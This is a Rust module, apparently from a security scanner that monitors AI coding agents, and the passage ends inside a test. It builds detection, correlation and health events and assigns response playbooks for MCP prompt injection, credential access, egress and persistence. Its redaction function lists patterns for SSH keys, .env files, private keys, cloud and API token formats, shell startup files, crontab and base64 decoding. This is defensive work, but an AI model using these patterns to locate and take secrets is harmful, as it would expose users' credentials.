use std::collections::{BTreeMap, BTreeSet};
use std::fs::OpenOptions;
use std::io::Write;
use std::path::Path;

use regex::Regex;
use serde::Serialize;
use sha2::{Digest, Sha256};
use time::OffsetDateTime;
use uuid::Uuid;

use crate::clients::ClientId;
use crate::discovery::Source;
use crate::parser::ParseError;
use crate::scoring::{RiskThresholds, assess_risk_with_thresholds, load_thresholds};

const SCHEMA_VERSION: &str = "1.0";
const MAX_REDACTED_EVIDENCE_CHARS: usize = 512;
const TRUNCATED_EVIDENCE_SUFFIX: &str = "[truncated]";

#[derive(Debug, Serialize)]
pub struct Event {
    pub timestamp: String,
    pub event_time: Option<String>,
    pub observed_at: String,
    pub ingested_at: String,
    pub time_source: String,
    pub time_confidence: String,
    pub time_override_reason: Option<String>,
    pub schema_version: String,
    pub event_id: String,
    pub event_type: String,
    pub severity: String,
    pub risk_score: u32,
    pub client: String,
    pub agent: Option<String>,
    pub model: Option<String>,
    pub provider: Option<String>,
    pub session_id: String,
    pub workspace: Option<String>,
    pub source_path_hash: Option<String>,
    pub tool_name: Option<String>,
    pub rule_ids: Vec<String>,
    pub categories: Vec<String>,
    pub detection_classes: Vec<String>,
    pub signal_types: Vec<String>,
    pub analytic_intents: Vec<String>,
    pub atlas_tags: Vec<String>,
    pub tags: Vec<String>,
    pub evidence: Vec<Evidence>,
    pub triage: Option<serde_json::Value>,
    pub response: Option<ResponseMetadata>,
    pub source_counts: Option<BTreeMap<String, u32>>,
    pub component: Option<String>,
    pub check_name: Option<String>,
    pub status: Option<String>,
    pub adr_version: Option<String>,
    pub scan_duration_ms: Option<u64>,
    pub rule_count: Option<usize>,
    pub threshold_config: Option<RiskThresholds>,
    pub active_policy_name: Option<String>,
}

#[derive(Debug, Clone, Serialize)]
pub struct Evidence {
    pub field: String,
    pub redacted_value: String,
    pub hash: Option<String>,
    pub rule_id: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct ResponseMetadata {
    pub recommended_action: String,
    pub response_playbook: String,
    pub investigation_summary: String,
    pub escalation: String,
}

#[derive(Debug)]
pub struct DetectionEventInput {
    pub client: ClientId,
    pub agent: Option<String>,
    pub model: Option<String>,
    pub provider: Option<String>,
    pub session_id: String,
    pub source_path_hash: String,
    pub tool_name: Option<String>,
    pub rule_ids: Vec<String>,
    pub categories: Vec<String>,
    pub detection_classes: Vec<String>,
    pub signal_types: Vec<String>,
    pub analytic_intents: Vec<String>,
    pub atlas_tags: Vec<String>,
    pub tags: Vec<String>,
    pub evidence: Vec<Evidence>,
    pub risk_score: u32,
    pub event_time: Option<String>,
}

#[derive(Debug)]
pub struct ActivityEventInput {
    pub client: ClientId,
    pub agent: Option<String>,
    pub model: Option<String>,
    pub provider: Option<String>,
    pub session_id: String,
    pub source_path_hash: String,
    pub tool_name: Option<String>,
    pub tags: Vec<String>,
    pub evidence: Vec<Evidence>,
    pub risk_score: u32,
    pub event_time: Option<String>,
}

#[derive(Debug)]
pub struct SessionRiskSummaryEventInput {
    pub client: String,
    pub agent: Option<String>,
    pub model: Option<String>,
    pub provider: Option<String>,
    pub session_id: String,
    pub source_path_hash: Option<String>,
    pub rule_ids: Vec<String>,
    pub categories: Vec<String>,
    pub detection_classes: Vec<String>,
    pub signal_types: Vec<String>,
    pub analytic_intents: Vec<String>,
    pub atlas_tags: Vec<String>,
    pub tags: Vec<String>,
    pub evidence: Vec<Evidence>,
    pub risk_score: u32,
    pub event_time: Option<String>,
}

#[derive(Debug)]
pub struct OperationalAlertInput {
    pub alert_type: String,
    pub threshold: String,
    pub actual_value: String,
    pub scan_duration_ms: Option<u64>,
    pub scanner_error_count: Option<u32>,
}

#[derive(Debug, Clone, Copy)]
pub struct OperationalAlertConfig {
    pub max_scanner_errors: u32,
    pub max_scan_duration_ms: u64,
    pub max_source_silence_ms: u64,
}

impl Default for OperationalAlertConfig {
    fn default() -> Self {
        Self {
            max_scanner_errors: 3,
            max_scan_duration_ms: 300_000,     // 5 minutes
            max_source_silence_ms: 86_400_000, // 24 hours
        }
    }
}

pub fn load_operational_alert_config() -> OperationalAlertConfig {
    OperationalAlertConfig {
        max_scanner_errors: std::env::var("ADR_OP_ALERT_MAX_SCANNER_ERRORS")
            .ok()
            .and_then(|v| v.parse::<u32>().ok())
            .unwrap_or(3),
        max_scan_duration_ms: std::env::var("ADR_OP_ALERT_MAX_SCAN_DURATION_MS")
            .ok()
            .and_then(|v| v.parse::<u64>().ok())
            .unwrap_or(300_000),
        max_source_silence_ms: std::env::var("ADR_OP_ALERT_MAX_SOURCE_SILENCE_MS")
            .ok()
            .and_then(|v| v.parse::<u64>().ok())
            .unwrap_or(86_400_000),
    }
}

#[derive(Debug)]
pub struct CorrelationEventInput {
    pub client: String,
    pub agent: Option<String>,
    pub model: Option<String>,
    pub provider: Option<String>,
    pub shared_rule_ids: Vec<String>,
    pub sessions: Vec<CorrelationSessionInput>,
    pub window_start: String,
    pub window_end: String,
    pub max_risk_score: u32,
}

#[derive(Debug)]
pub struct CorrelationSessionInput {
    pub session_id: String,
    pub event_id: String,
    pub timestamp: String,
    pub severity: String,
    pub risk_score: u32,
}

#[derive(Debug, Clone, Copy)]
pub struct HealthEventInput<'a> {
    pub sources: &'a [Source],
    pub scan_duration_ms: u64,
    pub rule_count: usize,
    pub threshold_config: RiskThresholds,
    pub active_policy_name: Option<&'a str>,
}

#[derive(Debug)]
struct EventBuilder {
    event_time: Option<String>,
    event_type: &'static str,
    severity: &'static str,
    risk_score: u32,
    client: String,
    agent: Option<String>,
    model: Option<String>,
    provider: Option<String>,
    session_id: String,
    workspace: Option<String>,
    source_path_hash: Option<String>,
    tool_name: Option<String>,
    rule_ids: Vec<String>,
    categories: Vec<String>,
    detection_classes: Vec<String>,
    signal_types: Vec<String>,
    analytic_intents: Vec<String>,
    atlas_tags: Vec<String>,
    tags: Vec<String>,
    evidence: Vec<Evidence>,
    triage: Option<serde_json::Value>,
    response: Option<ResponseMetadata>,
    source_counts: Option<BTreeMap<String, u32>>,
    component: Option<String>,
    check_name: Option<String>,
    status: Option<String>,
    adr_version: Option<String>,
    scan_duration_ms: Option<u64>,
    rule_count: Option<usize>,
    threshold_config: Option<RiskThresholds>,
    active_policy_name: Option<String>,
}

impl EventBuilder {
    fn build(self) -> Event {
        let observed_at_dt = OffsetDateTime::now_utc();
        let observed_at = format_timestamp(observed_at_dt);
        let resolved_time = resolve_event_time(self.event_time.as_deref(), observed_at_dt);
        Event {
            timestamp: resolved_time.timestamp,
            event_time: resolved_time.event_time,
            observed_at: observed_at.clone(),
            ingested_at: observed_at,
            time_source: resolved_time.time_source,
            time_confidence: resolved_time.time_confidence,
            time_override_reason: resolved_time.time_override_reason,
            schema_version: SCHEMA_VERSION.to_string(),
            event_id: format!("adr-{}", Uuid::new_v4()),
            event_type: self.event_type.to_string(),
            severity: self.severity.to_string(),
            risk_score: self.risk_score,
            client: self.client,
            agent: self.agent,
            model: self.model,
            provider: self.provider,
            session_id: self.session_id,
            workspace: self.workspace,
            source_path_hash: self.source_path_hash,
            tool_name: self.tool_name.filter(|s| s != "null"),
            rule_ids: self.rule_ids,
            categories: self.categories,
            detection_classes: self.detection_classes,
            signal_types: self.signal_types,
            analytic_intents: self.analytic_intents,
            atlas_tags: self.atlas_tags,
            tags: self.tags,
            evidence: self.evidence,
            triage: self.triage,
            response: self.response,
            source_counts: self.source_counts,
            component: self.component,
            check_name: self.check_name,
            status: self.status,
            adr_version: self.adr_version,
            scan_duration_ms: self.scan_duration_ms,
            rule_count: self.rule_count,
            threshold_config: self.threshold_config,
            active_policy_name: self.active_policy_name,
        }
    }
}

pub fn health_event_with_metadata(input: HealthEventInput<'_>) -> Event {
    let sources = input.sources;
    let clients: BTreeSet<&str> = sources
        .iter()
        .map(|source| source.client.as_str())
        .collect();
    let evidence = vec![source_inventory_evidence(sources)];

    EventBuilder {
        event_time: None,
        event_type: "health",
        severity: "informational",
        risk_score: 0,
        client: if clients.is_empty() {
            "none".to_string()
        } else {
            clients.into_iter().collect::<Vec<_>>().join(",")
        },
        agent: None,
        model: None,
        provider: None,
        session_id: "scanner".to_string(),
        workspace: None,
        source_path_hash: None,
        tool_name: None,
        rule_ids: Vec::new(),
        categories: Vec::new(),
        detection_classes: Vec::new(),
        signal_types: Vec::new(),
        analytic_intents: Vec::new(),
        atlas_tags: Vec::new(),
        tags: vec!["scanner".to_string(), "discovery".to_string()],
        evidence,
        triage: None,
        response: None,
        source_counts: Some(source_counts(sources)),
        component: Some("scanner".to_string()),
        check_name: Some("source_discovery".to_string()),
        status: Some("ok".to_string()),
        adr_version: Some(env!("CARGO_PKG_VERSION").to_string()),
        scan_duration_ms: Some(input.scan_duration_ms),
        rule_count: Some(input.rule_count),
        threshold_config: Some(input.threshold_config),
        active_policy_name: input.active_policy_name.map(str::to_string),
    }
    .build()
}

pub fn detection_event(input: DetectionEventInput) -> Event {
    let thresholds = load_thresholds();
    let assessment = assess_risk_with_thresholds(input.risk_score, thresholds);
    let response = response_metadata(
        assessment.severity.as_str(),
        &input.rule_ids,
        &input.categories,
        assessment.triage_required,
    );
    let triage = if assessment.triage_required {
        serde_json::json!({
            "required": true,
            "verdict": "pending"
        })
    } else {
        serde_json::json!({
            "required": false,
            "verdict": "not_required"
        })
    };
    EventBuilder {
        event_time: input.event_time,
        event_type: "detection",
        severity: assessment.severity.as_str(),
        risk_score: input.risk_score,
        client: input.client.as_str().to_string(),
        agent: input.agent,
        model: input.model,
        provider: input.provider,
        session_id: input.session_id,
        workspace: None,
        source_path_hash: Some(input.source_path_hash),
        tool_name: input.tool_name,
        rule_ids: input.rule_ids,
        categories: input.categories,
        detection_classes: input.detection_classes,
        signal_types: input.signal_types,
        analytic_intents: input.analytic_intents,
        atlas_tags: input.atlas_tags,
        tags: input.tags,
        evidence: input.evidence,
        triage: Some(triage),
        response: Some(response),
        source_counts: None,
        component: None,
        check_name: None,
        status: None,
        adr_version: None,
        scan_duration_ms: None,
        rule_count: None,
        threshold_config: None,
        active_policy_name: None,
    }
    .build()
}

pub fn activity_event(input: ActivityEventInput) -> Event {
    let thresholds = load_thresholds();
    let assessment = assess_risk_with_thresholds(input.risk_score, thresholds);
    EventBuilder {
        event_time: input.event_time,
        event_type: "activity",
        severity: assessment.severity.as_str(),
        risk_score: input.risk_score,
        client: input.client.as_str().to_string(),
        agent: input.agent,
        model: input.model,
        provider: input.provider,
        session_id: input.session_id,
        workspace: None,
        source_path_hash: Some(input.source_path_hash),
        tool_name: input.tool_name,
        rule_ids: Vec::new(),
        categories: Vec::new(),
        detection_classes: Vec::new(),
        signal_types: Vec::new(),
        analytic_intents: Vec::new(),
        atlas_tags: Vec::new(),
        tags: input.tags,
        evidence: input.evidence,
        triage: None,
        response: None,
        source_counts: None,
        component: None,
        check_name: None,
        status: None,
        adr_version: None,
        scan_duration_ms: None,
        rule_count: None,
        threshold_config: None,
        active_policy_name: None,
    }
    .build()
}

pub fn session_risk_summary_event(input: SessionRiskSummaryEventInput) -> Event {
    let thresholds = load_thresholds();
    let assessment = assess_risk_with_thresholds(input.risk_score, thresholds);
    EventBuilder {
        event_time: input.event_time,
        event_type: "session_risk_summary",
        severity: assessment.severity.as_str(),
        risk_score: input.risk_score,
        client: input.client,
        agent: input.agent,
        model: input.model,
        provider: input.provider,
        session_id: input.session_id,
        workspace: None,
        source_path_hash: input.source_path_hash,
        tool_name: None,
        rule_ids: input.rule_ids,
        categories: input.categories,
        detection_classes: input.detection_classes,
        signal_types: input.signal_types,
        analytic_intents: input.analytic_intents,
        atlas_tags: input.atlas_tags,
        tags: input.tags,
        evidence: input.evidence,
        triage: None,
        response: None,
        source_counts: None,
        component: None,
        check_name: None,
        status: None,
        adr_version: None,
        scan_duration_ms: None,
        rule_count: None,
        threshold_config: None,
        active_policy_name: None,
    }
    .build()
}

pub fn correlation_event(input: CorrelationEventInput) -> Event {
    let thresholds = load_thresholds();
    let assessment = assess_risk_with_thresholds(input.max_risk_score, thresholds);
    let mut evidence = vec![
        Evidence {
            field: "shared_rule_ids".to_string(),
            redacted_value: input.shared_rule_ids.join(","),
            hash: None,
            rule_id: None,
        },
        Evidence {
            field: "correlation_window".to_string(),
            redacted_value: format!("{}..{}", input.window_start, input.window_end),
            hash: None,
            rule_id: None,
        },
    ];
    evidence.extend(input.sessions.into_iter().map(|session| Evidence {
        field: "related_detection".to_string(),
        redacted_value: format!(
            "session_id={}; event_id={}; timestamp={}; severity={}; risk_score={}",
            session.session_id,
            session.event_id,
            session.timestamp,
            session.severity,
            session.risk_score
        ),
        hash: Some(evidence_hash(&session.event_id)),
        rule_id: None,
    }));

    EventBuilder {
        event_time: Some(input.window_end.clone()),
        event_type: "correlation",
        severity: assessment.severity.as_str(),
        risk_score: input.max_risk_score,
        client: input.client,
        agent: input.agent,
        model: input.model,
        provider: input.provider,
        session_id: "correlation".to_string(),
        workspace: None,
        source_path_hash: None,
        tool_name: None,
        rule_ids: input.shared_rule_ids,
        categories: vec!["cross_session_correlation".to_string()],
        detection_classes: vec!["security_detection".to_string()],
        signal_types: vec!["correlation".to_string()],
        analytic_intents: vec!["alert".to_string()],
        atlas_tags: Vec::new(),
        tags: vec!["correlation".to_string(), "cross_session".to_string()],
        evidence,
        triage: None,
        response: None,
        source_counts: None,
        component: None,
        check_name: None,
        status: None,
        adr_version: None,
        scan_duration_ms: None,
        rule_count: None,
        threshold_config: None,
        active_policy_name: None,
    }
    .build()
}

pub fn scanner_error_event(source: &Source, error: &ParseError) -> Event {
    let error_msg = redact_error_message(&error.to_string());
    let source_label = format!(
        "{}:{}:{}",
        source.client.as_str(),
        source.kind.as_str(),
        display_name(source)
    );
    EventBuilder {
        event_time: None,
        event_type: "scanner_error",
        severity: "informational",
        risk_score: 0,
        client: source.client.as_str().to_string(),
        agent: None,
        model: None,
        provider: None,
        session_id: "scanner".to_string(),
        workspace: None,
        source_path_hash: Some(path_hash(&source.path)),
        tool_name: None,
        rule_ids: Vec::new(),
        categories: Vec::new(),
        detection_classes: Vec::new(),
        signal_types: Vec::new(),
        analytic_intents: Vec::new(),
        atlas_tags: Vec::new(),
        tags: vec!["scanner".to_string(), "parse_failure".to_string()],
        evidence: vec![
            Evidence {
                field: "error".to_string(),
                redacted_value: error_msg,
                hash: None,
                rule_id: None,
            },
            Evidence {
                field: "source_path".to_string(),
                redacted_value: source_label,
                hash: Some(path_hash(&source.path)),
                rule_id: None,
            },
        ],
        triage: None,
        response: None,
        source_counts: None,
        component: Some("scanner".to_string()),
        check_name: Some("source_parse".to_string()),
        status: Some("degraded".to_string()),
        adr_version: None,
        scan_duration_ms: None,
        rule_count: None,
        threshold_config: None,
        active_policy_name: None,
    }
    .build()
}

pub fn operational_alert_event(input: OperationalAlertInput) -> Event {
    let mut evidence = vec![
        Evidence {
            field: "alert_type".to_string(),
            redacted_value: input.alert_type.clone(),
            hash: None,
            rule_id: None,
        },
        Evidence {
            field: "threshold".to_string(),
            redacted_value: input.threshold.clone(),
            hash: None,
            rule_id: None,
        },
        Evidence {
            field: "actual_value".to_string(),
            redacted_value: input.actual_value.clone(),
            hash: None,
            rule_id: None,
        },
    ];
    if let Some(duration) = input.scan_duration_ms {
        evidence.push(Evidence {
            field: "scan_duration_ms".to_string(),
            redacted_value: duration.to_string(),
            hash: None,
            rule_id: None,
        });
    }
    if let Some(count) = input.scanner_error_count {
        evidence.push(Evidence {
            field: "scanner_error_count".to_string(),
            redacted_value: count.to_string(),
            hash: None,
            rule_id: None,
        });
    }

    EventBuilder {
        event_time: None,
        event_type: "operational_alert",
        severity: "warning",
        risk_score: 0,
        client: "scanner".to_string(),
        agent: None,
        model: None,
        provider: None,
        session_id: "scanner".to_string(),
        workspace: None,
        source_path_hash: None,
        tool_name: None,
        rule_ids: Vec::new(),
        categories: vec!["operational".to_string()],
        detection_classes: vec!["operational_health".to_string()],
        signal_types: vec!["atomic".to_string()],
        analytic_intents: vec!["alert".to_string()],
        atlas_tags: Vec::new(),
        tags: vec!["operational".to_string(), "scanner_health".to_string()],
        evidence,
        triage: None,
        response: None,
        source_counts: None,
        component: Some("scanner".to_string()),
        check_name: Some(operational_alert_check_name(&input.alert_type).to_string()),
        status: Some("degraded".to_string()),
        adr_version: Some(env!("CARGO_PKG_VERSION").to_string()),
        scan_duration_ms: input.scan_duration_ms,
        rule_count: None,
        threshold_config: None,
        active_policy_name: None,
    }
    .build()
}

fn operational_alert_check_name(alert_type: &str) -> &str {
    match alert_type {
        "scanner_error_threshold_exceeded" => "scanner_error_threshold",
        "scan_duration_threshold_exceeded" => "scan_duration_threshold",
        "source_silence_threshold_exceeded" => "source_silence_threshold",
        _ => "operational_alert",
    }
}

fn response_metadata(
    severity: &str,
    rule_ids: &[String],
    categories: &[String],
    triage_required: bool,
) -> ResponseMetadata {
    ResponseMetadata {
        recommended_action: recommended_action(severity).to_string(),
        response_playbook: response_playbook(rule_ids, categories).to_string(),
        investigation_summary: investigation_summary(severity, rule_ids, categories),
        escalation: if triage_required {
            "security_review_required".to_string()
        } else {
            "routine_review".to_string()
        },
    }
}

fn recommended_action(severity: &str) -> &'static str {
    match severity {
        "critical" => "investigate_immediately",
        "high" => "investigate",
        "medium" => "review",
        _ => "monitor",
    }
}

struct ResolvedEventTime {
    timestamp: String,
    event_time: Option<String>,
    time_source: String,
    time_confidence: String,
    time_override_reason: Option<String>,
}

fn resolve_event_time(
    source_event_time: Option<&str>,
    observed_at: OffsetDateTime,
) -> ResolvedEventTime {
    let observed_timestamp = format_timestamp(observed_at);
    let Some(raw_event_time) = source_event_time else {
        return ResolvedEventTime {
            timestamp: observed_timestamp.clone(),
            event_time: None,
            time_source: "observed".to_string(),
            time_confidence: "low".to_string(),
            time_override_reason: Some("missing_source_timestamp".to_string()),
        };
    };

    let Some(parsed_event_time) = parse_event_timestamp(raw_event_time) else {
        return ResolvedEventTime {
            timestamp: observed_timestamp.clone(),
            event_time: Some(raw_event_time.to_string()),
            time_source: "override".to_string(),
            time_confidence: "low".to_string(),
            time_override_reason: Some("unparseable_source_timestamp".to_string()),
        };
    };

    let normalized_event_time = format_timestamp(parsed_event_time);
    let future_skew_limit = time::Duration::minutes(5);
    if parsed_event_time > observed_at + future_skew_limit {
        return ResolvedEventTime {
            timestamp: observed_timestamp,
            event_time: Some(normalized_event_time),
            time_source: "override".to_string(),
            time_confidence: "low".to_string(),
            time_override_reason: Some("source_timestamp_future_skew".to_string()),
        };
    }

    ResolvedEventTime {
        timestamp: normalized_event_time.clone(),
        event_time: Some(normalized_event_time),
        time_source: "source".to_string(),
        time_confidence: "high".to_string(),
        time_override_reason: None,
    }
}

pub fn parse_event_timestamp(value: &str) -> Option<OffsetDateTime> {
    OffsetDateTime::parse(value, &time::format_description::well_known::Rfc3339).ok()
}

pub fn format_timestamp(timestamp: OffsetDateTime) -> String {
    let timestamp = timestamp
        .to_offset(time::UtcOffset::UTC)
        .replace_microsecond(0)
        .expect("valid microsecond replacement")
        .replace_nanosecond(0)
        .expect("valid nanosecond replacement");
    timestamp
        .format(&time::macros::format_description!(
            "[year]-[month]-[day]T[hour]:[minute]:[second].[subsecond digits:3]Z"
        ))
        .expect("fixed RFC3339 millisecond timestamp")
}

fn response_playbook(rule_ids: &[String], categories: &[String]) -> &'static str {
    let has_rule = |needle: &str| rule_ids.iter().any(|rule_id| rule_id.contains(needle));
    let has_category = |needle: &str| categories.iter().any(|category| category.contains(needle));

    if has_rule("mcp") || has_category("mcp") {
        "adr-playbook-mcp-prompt-injection"
    } else if has_rule("credential") || has_rule("secret") || has_category("credential") {
        "adr-playbook-credential-access"
    } else if has_rule("exfil") || has_category("network") || has_category("exfil") {
        "adr-playbook-network-egress"
    } else if has_rule("persistence") || has_category("persistence") {
        "adr-playbook-persistence"
    } else {
        "adr-playbook-general-investigation"
    }
}

fn investigation_summary(severity: &str, rule_ids: &[String], categories: &[String]) -> String {
    let rule_summary = if rule_ids.is_empty() {
        "no rule id".to_string()
    } else {
        rule_ids.join(",")
    };
    let category_summary = if categories.is_empty() {
        "uncategorized".to_string()
    } else {
        categories.join(",")
    };
    format!(
        "{severity} ADR detection matched {rule_summary} in {category_summary}; review redacted evidence, timeline anchors when present, and the local source session before containment."
    )
}

fn redact_error_message(msg: &str) -> String {
    let redacted =
        Regex::new(r"(?i)([A-Z]:\\[^\s]+|\\\\[^\s]+|/home/\S+|/Users/\S+|/tmp/\S+|/var/\S+)")
            .expect("path redaction regex")
            .replace_all(msg, "<path>")
            .into_owned();
    let redacted = Regex::new(r"(?i)\b(token|key|secret|password|credential)\s*[:=]\s*\S+")
        .expect("secret redaction regex")
        .replace_all(&redacted, "[redacted-secret]")
        .into_owned();
    if redacted.len() > 200 {
        format!("{}...", &redacted[..197])
    } else {
        redacted
    }
}

pub fn append_jsonl_events(
    path: &Path,
    events: &[Event],
) -> Result<(), Box<dyn std::error::Error>> {
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent)?;
    }

    let mut file = OpenOptions::new().create(true).append(true).open(path)?;
    for event in events {
        serde_json::to_writer(&mut file, event)?;
        file.write_all(b"\n")?;
    }
    Ok(())
}

pub fn path_hash(path: &Path) -> String {
    let mut hasher = Sha256::new();
    hasher.update(path.to_string_lossy().as_bytes());
    format!("{:x}", hasher.finalize())
}

pub fn evidence_hash(value: &str) -> String {
    let mut hasher = Sha256::new();
    hasher.update(value.as_bytes());
    format!("{:x}", hasher.finalize())
}

pub fn redact_sensitive_text(text: &str) -> String {
    let mut excerpt = text
        .split_whitespace()
        .take(80)
        .collect::<Vec<_>>()
        .join(" ");
    excerpt = excerpt.replace(
        "https://darkroastcyber.io/mcp-lab",
        "https://darkroastcyber.io/[redacted]",
    );
    excerpt = excerpt.replace("darkroastcyber.io", "[controlled-domain]");
    excerpt = excerpt.replace(".env", "[sensitive-path]");
    excerpt = excerpt.replace("id_rsa", "[redacted-secret]");
    excerpt = excerpt.replace("id_ed25519", "[redacted-secret]");
    excerpt = excerpt.replace(".pem", "[redacted-secret]");
    excerpt = excerpt.replace("api key", "[redacted-secret]");
    excerpt = excerpt.replace("api token", "[redacted-secret]");
    excerpt = excerpt.replace("credential", "[redacted-secret]");
    excerpt =
        Regex::new(r"(?i)-{5}\s*(BEGIN|END)\s+((RSA|OPENSSH|EC|DSA)\s+)?PRIVATE\s+KEY\s*-{5}")
            .expect("private key boundary regex")
            .replace_all(&excerpt, "[redacted-secret]")
            .into_owned();
    excerpt = Regex::new(r"(?i)\b((RSA|OPENSSH|EC|DSA)\s+)?PRIVATE\s+KEY\b")
        .expect("private key phrase regex")
        .replace_all(&excerpt, "[redacted-secret]")
        .into_owned();
    excerpt = Regex::new(
        r"(?i)\b(npm|pnpm|yarn|bun|pip|pipx|uv|cargo|go|brew|apt|apt-get|dnf|yum)\b\s+(install|add|i|get|run|create|x)(\s+\S+)?",
    )
    .expect("package manager regex")
    .replace_all(&excerpt, "[package-manager-command]")
    .into_owned();
    excerpt = Regex::new(
        r"(?i)(~/)?\.(bashrc|zshrc|profile|bash_profile)\b|config/fish/config\.fish|crontab",
    )
    .expect("startup target regex")
    .replace_all(&excerpt, "[startup-target]")
    .into_owned();
    excerpt = Regex::new(r"(?i)\bbase64\s+(-d|--decode)\b")
        .expect("encoded decoder regex")
        .replace_all(&excerpt, "[encoded-decoder]")
        .into_owned();
    excerpt = Regex::new(r"\bgh[pousr]_[A-Za-z0-9_-]{16,}\b")
        .expect("credential regex")
        .replace_all(&excerpt, "[redacted-secret]")
        .into_owned();
    excerpt = Regex::new(r"\bsk-[A-Za-z0-9_-]{16,}\b")
        .expect("credential regex")
        .replace_all(&excerpt, "[redacted-secret]")
        .into_owned();
    excerpt = Regex::new(r"\bAKIA[0-9A-Z]{16}\b")
        .expect("credential regex")
        .replace_all(&excerpt, "[redacted-secret]")
        .into_owned();
    excerpt = Regex::new(r"\bxox[baprs]-[A-Za-z0-9-]{20,}\b")
        .expect("credential regex")
        .replace_all(&excerpt, "[redacted-secret]")
        .into_owned();
    excerpt = Regex::new(r"\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b")
        .expect("credential regex")
        .replace_all(&excerpt, "[redacted-secret]")
        .into_owned();
    excerpt = Regex::new(r"(?i)\bBearer\s+[A-Za-z0-9._~+/=_-]{20,}\b")
        .expect("credential regex")
        .replace_all(&excerpt, "[redacted-secret]")
        .into_owned();
    excerpt = Regex::new(r"\b[A-Za-z0-9+/]{20,}={0,2}\b")
        .expect("encoded blob regex")
        .replace_all(&excerpt, "[encoded-blob]")
        .into_owned();
    truncate_redacted_evidence(&excerpt)
}

fn truncate_redacted_evidence(excerpt: &str) -> String {
    if excerpt.chars().count() <= MAX_REDACTED_EVIDENCE_CHARS {
        return excerpt.to_string();
    }

    let keep_chars = MAX_REDACTED_EVIDENCE_CHARS.saturating_sub(TRUNCATED_EVIDENCE_SUFFIX.len());
    let truncated = excerpt.chars().take(keep_chars).collect::<String>();
    if keep_chars == 0 {
        TRUNCATED_EVIDENCE_SUFFIX.to_string()
    } else {
        format!("{truncated}{TRUNCATED_EVIDENCE_SUFFIX}")
    }
}

fn source_counts(sources: &[Source]) -> BTreeMap<String, u32> {
    let mut counts = BTreeMap::new();
    for source in sources {
        let key = format!("{}.{}", source.client.as_str(), source.kind.as_str());
        *counts.entry(key).or_insert(0) += 1;
    }
    counts
}

fn source_inventory_evidence(sources: &[Source]) -> Evidence {
    let counts = source_counts(sources);
    let mut inventory = sources
        .iter()
        .map(|source| {
            format!(
                "{}:{}:{}",
                source.client.as_str(),
                source.kind.as_str(),
                path_hash(&source.path)
            )
        })
        .collect::<Vec<_>>();
    inventory.sort();

    let mut hasher = Sha256::new();
    for item in &inventory {
        hasher.update(item.as_bytes());
        hasher.update(b"\n");
    }

    Evidence {
        field: "source_inventory".to_string(),
        redacted_value: format!(
            "sources={}; client_source_kinds={}",
            sources.len(),
            counts.len()
        ),
        hash: Some(format!("{:x}", hasher.finalize())),
        rule_id: None,
    }
}

fn display_name(source: &Source) -> String {
    source
        .path
        .file_name()
        .and_then(|name| name.to_str())
        .unwrap_or("unknown")
        .to_string()
}

#[cfg(test)]
mod tests {
    use super::{
        DetectionEventInput, HealthEventInput, OperationalAlertInput, detection_event,
        format_timestamp, health_event_with_metadata, operational_alert_event,
        parse_event_timestamp, redact_error_message, redact_sensitive_text, scanner_error_event,
    };
    use crate::clients::ClientId;
    use crate::scoring::{RiskSeverity, RiskThresholds, assess_risk_with_thresholds};

    #[test]
    fn detection_event_uses_threshold_based_severity() {
        assert_eq!(
            assess_risk_with_thresholds(
                69,
                RiskThresholds {
                    low: 20,
                    medium: 50,
                    triage: 70,
                    alert: 90,
                },
            )
            .severity,
            RiskSeverity::Medium
        );
        assert_eq!(
            assess_risk_with_thresholds(
                70,
                RiskThresholds {
                    low: 20,
                    medium: 50,
                    triage: 70,
                    alert: 90,
                },
            )
            .severity,
            RiskSeverity::High
        );
        assert_eq!(
            assess_risk_with_thresholds(
                90,
                RiskThresholds {
                    low: 20,
                    medium: 50,
                    triage: 70,
                    alert: 90,
                },
            )
            .severity,
            RiskSeverity::Critical
        );
    }

    #[test]
    fn health_event_has_steady_state_check_dimensions() {
        let event = health_event_with_metadata(HealthEventInput {
            sources: &[],
            scan_duration_ms: 7,
            rule_count: 3,
            threshold_config: crate::scoring::load_thresholds(),
            active_policy_name: None,
        });

        assert_eq!(event.event_type, "health");
        assert_eq!(event.component.as_deref(), Some("scanner"));
        assert_eq!(event.check_name.as_deref(), Some("source_discovery"));
        assert_eq!(event.status.as_deref(), Some("ok"));
    }

    #[test]
    fn detection_event_serializes_alert_severity_for_high_scores() {
        let event = detection_event(DetectionEventInput {
            client: ClientId::Codex,
            agent: None,
            model: None,
            provider: None,
            session_id: "session".to_string(),
            source_path_hash: "hash".to_string(),
            tool_name: None,
            rule_ids: vec!["rule".to_string()],
            categories: vec!["category".to_string()],
            detection_classes: Vec::new(),
            signal_types: Vec::new(),
            analytic_intents: Vec::new(),
            atlas_tags: Vec::new(),
            tags: vec!["tag".to_string()],
            evidence: Vec::new(),
            risk_score: 90,
            event_time: Some("2026-05-01T00:00:00Z".to_string()),
        });

        assert_eq!(event.severity, "critical");
        assert_eq!(event.timestamp, "2026-05-01T00:00:00.000Z");
        assert_eq!(
            event.event_time.as_deref(),
            Some("2026-05-01T00:00:00.000Z")
        );
        assert_eq!(event.time_source, "source");
        assert_eq!(event.time_confidence, "high");
        let triage = event.triage.expect("triage metadata");
        assert_eq!(triage["required"], true);
        assert_eq!(triage["verdict"], "pending");
    }

    #[test]
    fn detection_event_populates_triage_for_low_scores() {
        let event = detection_event(DetectionEventInput {
            client: ClientId::Codex,
            agent: None,
            model: None,
            provider: None,
            session_id: "session".to_string(),
            source_path_hash: "hash".to_string(),
            tool_name: None,
            rule_ids: vec!["rule".to_string()],
            categories: vec!["category".to_string()],
            detection_classes: Vec::new(),
            signal_types: Vec::new(),
            analytic_intents: Vec::new(),
            atlas_tags: Vec::new(),
            tags: vec!["tag".to_string()],
            evidence: Vec::new(),
            risk_score: 10,
            event_time: Some("2026-05-01T00:00:00Z".to_string()),
        });

        assert_eq!(event.severity, "informational");
        let triage = event.triage.expect("triage metadata");
        assert_eq!(triage["required"], false);
        assert_eq!(triage["verdict"], "not_required");
    }

    #[test]
    fn detection_event_populates_response_metadata() {
        let event = detection_event(DetectionEventInput {
            client: ClientId::Codex,
            agent: None,
            model: None,
            provider: None,
            session_id: "session".to_string(),
            source_path_hash: "hash".to_string(),
            tool_name: None,
            rule_ids: vec!["mcp.tool_metadata.prompt_injection".to_string()],
            categories: vec!["mcp_prompt_injection".to_string()],
            detection_classes: vec!["security_detection".to_string()],
